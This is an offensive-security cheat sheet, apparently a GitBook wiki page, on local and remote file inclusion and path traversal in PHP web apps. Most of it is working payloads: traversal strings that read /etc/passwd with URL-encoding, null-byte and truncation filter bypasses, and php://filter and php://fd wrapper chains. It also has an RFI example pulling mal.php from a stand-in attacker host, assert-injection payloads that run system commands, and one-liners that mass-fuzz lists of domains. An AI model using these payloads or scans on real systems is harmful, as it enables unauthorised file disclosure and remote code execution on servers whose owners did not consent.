# File Inclusion & Path Traversal

### Theory

File Inclusion refers to a vulnerability in web applications where an attacker can manipulate input parameters to **include** local or remote files on the application's running code. Path traversal (directory traversal) refers to a vulnerability where an attacker manipulate input parameters to obtain the contents of a file **outside** of the web server's web root.&#x20;

While directory traversal only allows us to access sensitive files stored on the server, such as configuration files, SSH keys, using a file inclusion, we may be able to execute local or remote files.

There are two types of file inclusion vulnerability:

* **Remote File Inclusion (RFI):** The file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is **disabled** by default (**allow\_url\_include**).
* **Local File Inclusion (LFI):** The sever loads a local file.

```bash
#Here is a very simple example of an LFI:
http://example.com/index.php?page=../../../etc/passwd

#Here is a very simple example of an RFI:
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```

## Practice

{% hint style="info" %}
In PHP, functions vulnerable to LFI are: `require`, `require_once`, `include`, `include_once`
{% endhint %}

{% hint style="danger" %}
When using curl for LFI/RFI/Path Traversal testing, we should use the `--path-as-is` argument to prevent curl from editing our request

```
curl 'http://10.10.10.8/../../../../etc/passwd' --path-as-is
```
{% endhint %}

#### Tools

{% tabs %}
{% tab title="One-Liners" %}
Here are some handy one-liners to automate LFI scans on domains or urls using tools like [gau](https://github.com/lc/gau), [hakrawler](https://github.com/hakluke/hakrawler), [waybackurls](https://github.com/tomnomnom/waybackurls), [katana](https://github.com/projectdiscovery/katana), [uro](https://github.com/s0md3v/uro), [qsreplace](https://github.com/tomnomnom/qsreplace), [httpx](https://github.com/projectdiscovery/httpx), [Gospider](https://github.com/jaeles-project/gospider).

{% hint style="success" %}
It may be usefull for bug bounty hunting
{% endhint %}

{% hint style="info" %}
**domains.txt** -> text file containing domain names (ex: test.domain.com)

**urls.txt** -> text file containing URLs (ex: http://test.domain.com)
{% endhint %}

```bash
# Fuzz on multiple domains using a wordlist
# You may want to edit the wordlist
cat domains.txt | (gau || hakrawler || waybackurls || katana) | xargs -I% -P 25 sh -c 'for payload in $(cat /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt); do url=$(echo "%" | qsreplace "$payload"); curl -s "$url" 2>&1 | grep -q "root:x" && echo "VULN! $url"; done'

# Fuzz on multiple urls using a wordlist
# You may want to edit the wordlist
gospider -S urls.txt -c 10 -d 5 --blacklist ".(gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| gf lfi | xargs -I% -P 25 sh -c 'for payload in $(cat /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt); do url=$(echo "%" | qsreplace "$payload"); curl -s "$url" 2>&1 | grep -q "root:x" && echo "VULN! $url"; done'

# Fuzz on multiple domains using a single payload
# You may want to edit the payload
cat domains.txt | (gau || hakrawler || waybackurls || katana) | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# Fuzz on multiple urls using a single payload
# You may want to edit the payload
gospider -S urls.txt -c 10 -d 5 --blacklist ".(gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
{% endtab %}
{% endtabs %}

#### Basic LFI

{% tabs %}
{% tab title="Stripped Non-recursively" %}
You might be able to use nested traversal sequences, such as `....//` or `....\/`, which will revert to simple traversal sequences when the inner sequence is stripped.

```url
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
{% endtab %}

{% tab title="URL Encoding" %}
In some contexts, such as in a URL path or the `filename` parameter of a `multipart/form-data` request, web servers may strip any directory traversal sequences before passing your input to the application.\
You can sometimes bypass this kind of sanitization by **URL encoding**, or **even double URL encoding**, the `../` characters, resulting in `%2e%2e%2f` or `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also do the trick.

```url
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
{% endtab %}

{% tab title="Path Validation" %}
Maybe the back-end is checking the folder path:

```url
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
{% endtab %}

{% tab title="Folder Identification" %}
Depending on the applicative code / allowed characters, it might be possible to recursively explore the file system by discovering folders and not just files.

1. identify the "depth" of you current directory by succesfully retrieving `/etc/passwd` (if on Linux):

```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```

2. try and guess the name of a folder in the current directory by adding the folder name (here, `private`), and then going back to `/etc/passwd`:

```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd 
```

3. if the application is vulnerable, there might be two different outcomes to the request: an error / no output, the `private` folder does not exist at this location; if you get the content from `/etc/passwd`, you validated that there is indeed a `private`folder in your current directory

We can **weaponize** this process using `ffuf` and `sed`:

```bash
# Adapt to your needs
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
{% endtab %}

{% tab title="Wordlists" %}
You may use a wordlist to fuzz parameters and check if they are vulnerable to LFI :

* [file\_inclusion\_windows.txt](https://raw.githubusercontent.com/carlospolop/Auto\_Wordlists/main/wordlists/file\_inclusion\_windows.txt)
* [file\_inclusion\_linux.txt](https://raw.githubusercontent.com/carlospolop/Auto\_Wordlists/main/wordlists/file\_inclusion\_linux.txt)
{% endtab %}
{% endtabs %}

#### LFI filter evasion

{% tabs %}
{% tab title="Null Byte" %}
Bypass the append more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

```
http://example.com/index.php?page=../../../etc/passwd%00
```
{% endtab %}

{% tab title="Path Truncation" %}
Bypass the append of more chars at the end of the provided string (bypass of: $\_GET\['param']."php")

{% hint style="info" %}
**In PHP**: `/etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.`
{% endhint %}

```uri
#Always try to start the path with a fake directory (a/).url
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)
#This vulnerability was corrected in PHP 5.3.
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
{% endtab %}

{% tab title="Filter Bypass Tricks" %}
Here are some payload that may evade filters

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
```
{% endtab %}
{% endtabs %}

#### LFI / RFI using PHP filters

{% tabs %}
{% tab title="String " %}
Using string filters, we can processe all stream data through the specified function

```bash
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
http://example.com/index.php?page=php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd

## Same chain without the "|" char
http://example.com/index.php?page=php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd

## string.string_tags example
http://example.com/index.php?page=php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code;?>lalalala
```
{% endtab %}

{% tab title="Conversion" %}
Like the string.\* filters, the convert.\* filters perform conversion actions similar to their names.

```bash
# Conversion filter
## B64 decode
http://example.com/index.php?page=php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=

## B64 encode
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php

## Chain B64 encode and decode
http://example.com/index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd

## convert.quoted-printable-encode example
http://example.com/index.php?page=php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=
=C2=A3hellooo=3D

## convert.iconv.utf-8.utf-16le
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=
```
{% endtab %}

{% tab title="Compression" %}
The [Compression Wrappers](https://www.php.net/manual/en/wrappers.compression.php) provide a way of creating gzip and bz2 compatible files on the local filesystem.

```bash
# Compresion Filter
## Compress + B64
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

#PHP code To decompress the data locally
readfile('php://filter/zlib.inflate/resource=test.deflated');
```
{% endtab %}
{% endtabs %}

#### LFI / RFI using PHP protocols & wrappers

{% tabs %}
{% tab title=" File Descriptors" %}
This wrapper allows to access file descriptors that the process has open. Potentially useful to exfiltrate the content of opened files:

```bash
http://example.com/index.php?page=php://fd/3
```
{% endtab %}

{% tab title="Others" %}
Check more possible supported protocols [here](https://www.php.net/manual/en/wrappers.php)

* [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Write in memory or in a temporary file (not sure how this can be useful in a file inclusion attack)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Accessing local filesystem
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Accessing HTTP(s) URLs
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Accessing FTP(s) URLs
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Find pathnames matching pattern (It doesn't return nothing printable, so not really useful here)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Not useful to read arbitrary files)
{% endtab %}
{% endtabs %}

Find more PHP wrappers on this page:

{% content-ref url="lfi2rce/php-wrappers.md" %}
[php-wrappers.md](lfi2rce/php-wrappers.md)
{% endcontent-ref %}

#### LFI using PHP's assert

{% tabs %}
{% tab title="Enumerate" %}
If you encounter a difficult LFI that appears to be filtering traversal strings such as ".." and responding with something along the lines of "Hacking attempt" or "Nice try!", an 'assert' injection payload may work.

For example, with following code is vulnerable assuming that the **$file** parameter is vulnerable to LFI

```php
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
{% endtab %}

{% tab title="Exploit" %}
The following payload may work (be sure to URL-encode payloads before you send them):

```php
#Include files
' and die(show_source('/etc/passwd')) or '

#RCE
' and die(system("whoami")) or '
```
{% endtab %}
{% endtabs %}



### References

{% embed url="https://book.hacktricks.xyz/pentesting-web/file-inclusion" %}
